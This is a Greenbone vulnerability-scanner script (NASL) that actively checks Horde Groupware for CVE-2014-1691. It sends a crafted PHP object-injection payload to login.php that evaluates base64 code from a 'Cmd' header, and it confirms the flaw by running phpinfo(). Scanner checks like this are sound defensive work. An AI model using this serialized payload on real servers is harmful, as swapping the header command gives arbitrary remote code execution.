# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:horde:horde_groupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103926");
  script_version("2025-03-27T05:38:50+0000");
  script_tag(name:"last_modification", value:"2025-03-27 05:38:50 +0000 (Thu, 27 Mar 2025)");
  script_tag(name:"creation_date", value:"2014-03-21 11:45:12 +0100 (Fri, 21 Mar 2014)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2014-1691");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Horde 3.1.x <= 5.1.1 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("horde_http_detect.nasl");
  script_mandatory_keys("horde/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Horde is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Horde could allow a remote attacker to execute arbitrary code
  on the system, caused by the improper validation of _formvars form input.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code
  within the context of the affected application. Failed exploit attempts may result in denial of
  service conditions.");

  script_tag(name:"affected", value:"Horde version 3.1.x through 5.1.1.");

  script_tag(name:"solution", value:"Updates are available.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65200");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

formwars = '_formvars=O%3a34%3a%22Horde_Kolab_Server_Decorator_Clean%22%3a2%3a%7bs%3a43%3a%22%00Horde_Kolab_Server_Decorator_Clean%00'       +
           '_server%22%3bO%3a20%3a%22Horde_Prefs_Identity%22%3a2%3a%7bs%3a9%3a%22%00%2a%00_prefs%22%3bO%3a11%3a%22Horde_Prefs%22%3a2%3a'     +
           '%7bs%3a8%3a%22%00%2a%00_opts%22%3ba%3a1%3a%7bs%3a12%3a%22sizecallback%22%3ba%3a2%3a%7bi%3a0%3bO%3a12%3a%22Horde_Config%22%3a'    +
           '1%3a%7bs%3a13%3a%22%00%2a%00_oldConfig%22%3bs%3a46%3a%22eval%28base64_decode%28%24_SERVER%5bHTTP_CMD%5d%29%29%3bdie%28%29%3b'    +
           '%22%3b%7di%3a1%3bs%3a13%3a%22readXMLConfig%22%3b%7d%7ds%3a10%3a%22%00%2a%00_scopes%22%3ba%3a1%3a%7bs%3a5%3a%22horde%22%3bO%3'    +
           'a17%3a%22Horde_Prefs_Scope%22%3a1%3a%7bs%3a9%3a%22%00%2a%00_prefs%22%3ba%3a1%3a%7bi%3a0%3bi%3a1%3b%7d%7d%7d%7ds%3a13%3a%22'      +
           '%00%2a%00_prefnames%22%3ba%3a1%3a%7bs%3a10%3a%22identities%22%3bi%3a0%3b%7d%7ds%3a42%3a%22%00Horde_Kolab_Server_Decorator_Clean' +
           '%00_added%22%3ba%3a1%3a%7bi%3a0%3bi%3a1%3b%7d%7d';

url = dir + "/login.php";

headers = make_array( "Cmd", "cGhwaW5mbygpO2RpZTsK",  # phpinfo();die;
                      "Content-Type", "application/x-www-form-urlencoded" );

req = http_post_put_req( port:port, url:url, data:formwars, add_headers:headers );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

if( "<title>phpinfo()" >< res ) {
  report = 'It was possible to execute the "phpinfo()" function.\n\nResult:\n\n' + chomp( res );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
